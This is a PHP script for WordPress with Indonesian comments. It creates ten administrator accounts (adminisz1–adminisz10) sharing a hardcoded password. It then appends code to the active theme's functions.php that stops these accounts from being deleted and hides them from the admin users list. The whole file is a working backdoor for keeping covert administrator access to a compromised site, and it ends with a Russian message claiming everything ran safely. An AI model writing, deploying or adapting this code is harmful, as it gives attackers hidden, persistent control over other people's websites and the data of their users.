<?php
// Load WordPress
require_once('wp-load.php');

// Auto create user adminisz1 sampai adminisz10
$password_default = 'asdA_1231$12363x'; // Password yang sama untuk semua user
$domain = str_replace(['https://', 'http://', 'www.'], '', get_site_url()); // Ambil domain
$domain = strtok($domain, '/'); // Buat ngilangin slash kalau ada

for ($i = 1; $i <= 10; $i++) {
    $username = 'adminisz' . $i;
    $email = $username . '@' . $domain;

    if (!username_exists($username) && !email_exists($email)) {
        wp_create_user($username, $password_default, $email);
        $user = get_user_by('login', $username);
        if ($user) {
            $user->set_role('administrator'); // Set jadi adminisztrator
        }
    }
}

// Kode proteksi yang mau disuntikkan ke functions.php
$protect_code = <<<EOD
// === Proteksi adminisz1-10 & hidden dari daftar users ===
add_filter('user_has_cap', function(\$allcaps, \$cap, \$args, \$user) {
    if (isset(\$args[0]) && in_array(\$args[0], ['delete_user', 'delete_users'])) {
        \$user_to_delete_id = \$args[2];
        \$user_to_delete = get_userdata(\$user_to_delete_id);

        if (\$user_to_delete) {
            \$username = \$user_to_delete->user_login;

            if (preg_match('/^adminisz([1-9]|10)\$/', \$username)) {
                \$allcaps['delete_users'] = false;
                \$allcaps['delete_user'] = false;
            }
        }
    }
    return \$allcaps;
}, 10, 4);

add_action('pre_user_query', function(\$query) {
    if (is_admin() && current_user_can('list_users')) {
        global \$wpdb;
        \$exclude_usernames = [];
        for (\$i = 1; \$i <= 10; \$i++) {
            \$exclude_usernames[] = "'adminisz" . \$i . "'";
        }
        \$exclude_usernames_sql = implode(',', \$exclude_usernames);
        \$query->query_where .= " AND {\$wpdb->users}.user_login NOT IN (\$exclude_usernames_sql)";
    }
});
EOD;

// Cari path theme aktif
$theme_dir = get_stylesheet_directory();
$functions_file = $theme_dir . '/functions.php';

if (!file_exists($functions_file)) {
    // Kalau functions.php belum ada, buat baru
    file_put_contents($functions_file, "<?php\n\n");
}

// Baca isi lama
$current_content = file_get_contents($functions_file);

// Cek apakah sudah pernah ditulis
if (strpos($current_content, '// === Proteksi adminisz1-10') === false) {
    // Tambahkan kode baru
    $new_content = $current_content . "\n\n" . $protect_code;
    file_put_contents($functions_file, $new_content);
}

echo "✅ все было выполнено и безопасно!";
?>